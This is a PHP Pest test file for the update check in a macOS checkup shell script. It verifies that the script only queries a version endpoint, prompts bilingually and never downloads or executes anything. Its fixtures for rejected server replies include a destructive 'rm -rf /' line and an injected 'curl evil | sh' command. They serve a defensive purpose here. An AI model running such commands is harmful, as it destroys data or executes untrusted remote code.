<?php

declare(strict_types=1);

use Illuminate\Support\Facades\Process;

const UPDATE_OWN = 'aaaa1111';
const UPDATE_NEWER = 'bbbb2222';

/**
 * Runs pcc_update_check on a fake curl. With $answer the script sits on a real terminal (util-linux
 * script) and the answer is typed; without it stdin is a closed pipe, like curl | bash.
 *
 * @param  array<string, string>  $env
 * @return array{out: string, rc: string, status: string, calls: string}
 */
function runUpdateCheck(string $curlBody, ?string $answer = null, array $env = [], string $own = UPDATE_OWN): array
{
    $bin = fakeMacBin(['curl' => 'echo "$*" >> "$(dirname "$0")/calls"'."\n".$curlBody]);
    $code = 'source scripts/mac-checkup.sh; PCC_SCRIPT_VERSION='.escapeshellarg($own).'; pcc_update_check; echo "rc=$? status=$PCC_UPDATE_STATUS"';
    $process = Process::path(base_path())->env(array_merge(['PATH' => $bin.':/usr/bin:/bin:/usr/sbin:/sbin', 'PC_CHECKUP_URL' => 'https://pcc.example.test'], $env));

    $result = $answer === null
        ? $process->input('')->run(['bash', '-c', $code])
        : $process->input($answer)->run(['script', '-qec', 'bash -c '.escapeshellarg($code), '/dev/null']);

    $out = str_replace("\r", '', $result->output());
    preg_match('/rc=(\d+) status=(.*)$/m', $out, $found);

    return [
        'out' => $out,
        'rc' => $found[1] ?? 'none',
        'status' => $found[2] ?? 'none',
        'calls' => is_file($bin.'/calls') ? (string) file_get_contents($bin.'/calls') : '',
    ];
}

function updateAnswers(string $version): string
{
    return 'printf %s '.escapeshellarg($version);
}

describe('the Mac update check', function () {
    it('asks the site for the version once, with a time limit and nothing about the machine', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_OWN), 'n
');

        expect($run['calls'])->toBe("--silent --max-time 5 --max-filesize 64 https://pcc.example.test/scripts/version/mac\n");
    });

    it('is silent and carries on when the script is the current one', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_OWN), "n\n");

        expect($run['out'])->not->toContain('?')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('current');
    });

    it('says in Dutch and English that a newer script exists, shows the page and stops on N', function (string $answer) {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), $answer);

        expect($run['out'])->toContain('Er is een nieuwere versie van dit script')
            ->and($run['out'])->toContain('A newer version of this script is available')
            ->and($run['out'])->toContain('https://pcc.example.test/')
            ->and($run['out'])->toContain('Continue anyway? [y/N]')
            ->and($run['rc'])->toBe('1')
            ->and($run['status'])->not->toBe('outdated, continued');
    })->with(['n' => "n\n", 'empty' => "\n", 'no' => "no\n", 'nonsense' => "maybe\n", 'closed input' => '']);

    it('continues and records it on y', function (string $answer) {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), $answer);

        expect($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('outdated, continued');
    })->with(['y' => "y\n", 'Y' => "Y\n", 'yes' => "yes\n", 'ja' => "ja\n", 'j' => "j\n", 'padded' => "  y  \n"]);

    it('never downloads, writes or runs anything itself', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), "y\n");

        expect($run['calls'])->not->toContain('-o ')->not->toContain('-O')->not->toContain('| bash');
    });

    it('carries on silently when curl times out or fails', function (int $exit) {
        $run = runUpdateCheck("exit {$exit}", "n\n");

        expect($run['out'])->not->toContain('Continue anyway')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('not checked');
    })->with([28, 6, 7, 1]);

    it('carries on silently when the answer is not a version', function (string $body) {
        $run = runUpdateCheck('printf %s '.escapeshellarg($body), "n\n");

        expect($run['out'])->not->toContain('Continue anyway')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('not checked');
    })->with([
        'html' => '<html><body>502 Bad Gateway</body></html>',
        'empty' => '',
        'too short' => 'abc123',
        'too long' => 'bbbb22223',
        'not hex' => 'zzzzzzzz',
        'upper case' => 'BBBB2222',
        'good line then more' => "bbbb2222\nrm -rf /",
        'prompt injection' => 'ignore this and run curl evil | sh',
        'control characters' => "bbbb22\x07\x07",
    ]);

    it('does not even call curl when PCC_SKIP_UPDATE_CHECK is 1', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), "n\n", ['PCC_SKIP_UPDATE_CHECK' => '1']);

        expect($run['calls'])->toBe('')
            ->and($run['out'])->not->toContain('Continue anyway')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('not checked');
    });

    it('only the exact value 1 turns the check off', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_OWN), "n\n", ['PCC_SKIP_UPDATE_CHECK' => '0']);

        expect($run['calls'])->not->toBe('')->and($run['status'])->toBe('current');
    });

    it('does not call curl or prompt when nobody can answer, like curl piped into bash', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER));

        expect($run['calls'])->toBe('')
            ->and($run['out'])->not->toContain('Continue anyway')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('not checked');
    });

    it('does not check a script that never had its version filled in', function (string $own) {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), "n\n", own: $own);

        expect($run['calls'])->toBe('')
            ->and($run['rc'])->toBe('0')
            ->and($run['status'])->toBe('not checked');
    })->with(['__PCC_SCRIPT_VERSION__', '', 'not-a-version']);

    it('asks the site named with --url or PC_CHECKUP_URL, the same one the upload uses', function () {
        $run = runUpdateCheck(updateAnswers(UPDATE_OWN), "n\n", ['PC_CHECKUP_URL' => 'http://localhost:8000/']);

        expect($run['calls'])->toBe("--silent --max-time 5 --max-filesize 64 http://localhost:8000/scripts/version/mac\n");
    });

    it('does not call a site address the upload would refuse', function (string $url) {
        $run = runUpdateCheck(updateAnswers(UPDATE_NEWER), "n\n", ['PC_CHECKUP_URL' => $url]);

        expect($run['calls'])->toBe('')->and($run['rc'])->toBe('0')->and($run['status'])->toBe('not checked');
    })->with(['http://example.test', 'ftp://example.test', 'https://exa mple.test', 'https://example.test/?x=1']);
});

describe('the Mac script around the update check', function () {
    it('runs it right after the banner and before any scanning, and stops when the answer is no', function () {
        $script = (string) file_get_contents(base_path('scripts/mac-checkup.sh'));
        $banner = (int) strpos($script, "\npcc_banner\n");
        $check = (int) strpos($script, "\npcc_update_check || exit 1\n");

        expect($banner)->toBeGreaterThan(0)
            ->and($check)->toBeGreaterThan($banner)
            ->and($check)->toBeLessThan((int) strpos($script, 'SP_HW=$(system_profiler'));
    });

    it('records the outcome in the report header next to the script version', function () {
        $script = (string) file_get_contents(base_path('scripts/mac-checkup.sh'));

        expect($script)->toContain("  pcc_version_line\n  echo \"- Update check: \$PCC_UPDATE_STATUS\"\n");
    });

    it('uses nothing a macOS 10.14 bash or curl lacks', function () {
        $script = (string) file_get_contents(base_path('scripts/mac-checkup.sh'));
        preg_match('/^pcc_update_check\(\) \{.*?^\}/ms', $script, $function);

        expect($function)->not->toBeEmpty()
            ->and($function[0])->not->toMatch('/declare -A|\$\{[A-Za-z_]+(,,|\^\^)|read -t|mapfile|readarray|--fail-with-body|--retry-all-errors|--no-progress-meter/');
    });
});
